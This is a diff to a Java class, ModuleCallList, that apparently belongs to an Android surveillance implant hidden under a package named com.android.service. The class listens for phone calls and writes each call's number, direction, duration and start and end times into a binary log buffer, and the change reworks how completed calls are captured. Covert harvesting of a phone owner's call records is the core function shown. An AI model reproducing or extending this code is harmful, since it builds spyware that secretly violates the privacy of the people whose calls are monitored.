@@ -26,7 +26,7 @@ import com.android.service.util.WChar;
 public class ModuleCallList extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCallList"; //$NON-NLS-1$
 	private static boolean record = false;
-
+	
 	@Override
 	public boolean parse(ConfModule conf) {
 		if (conf.has("record")) {
@@ -65,8 +65,6 @@ public class ModuleCallList extends BaseModule implements Observer<Call> {
 		ListenerCall.self().detach(this);
 	}
 
-	Call callInAction;
-
 	public int notification(Call call) {
 		final String name = ""; //$NON-NLS-1$
 		final boolean missed = false;
@@ -77,26 +75,25 @@ public class ModuleCallList extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
 		}
 
-		if (call.isOngoing()) {
-			// Arrivano due call, in uscita, una con il number, l'altra senza.
-			if (call.getNumber().length() > 0) {
-				callInAction = call;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
+		}
+		
+		if (call.isComplete() == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
 			}
 
 			return 0;
 		}
-
-		if (Cfg.DEBUG) {
-			Check.asserts(callInAction != null, "null callInAction"); //$NON-NLS-1$
-		}
-
-		final boolean outgoing = !callInAction.isIncoming();
-		final int duration = call.getDuration(callInAction);
+		
+		final boolean outgoing = !call.isIncoming();
+		final int duration = call.getDuration(call);
 		final int LOG_CALLIST_VERSION = 0;
 
 		int len = 28; // 0x1C;
 
-		final String number = callInAction.getNumber();
+		final String number = call.getNumber();
 		len += wsize(number);
 		len += wsize(name);
 		len += wsize(note);
@@ -106,10 +103,8 @@ public class ModuleCallList extends BaseModule implements Observer<Call> {
 
 		final DataBuffer databuffer = new DataBuffer(data, 0, len);
 
-		final DateTime from = new DateTime(callInAction.getTimestamp());
+		final DateTime from = new DateTime(call.getTimestamp());
 		final DateTime to = new DateTime(call.getTimestamp());
-
-		callInAction = null;
 
 		databuffer.writeInt(len);
 		databuffer.writeInt(LOG_CALLIST_VERSION);
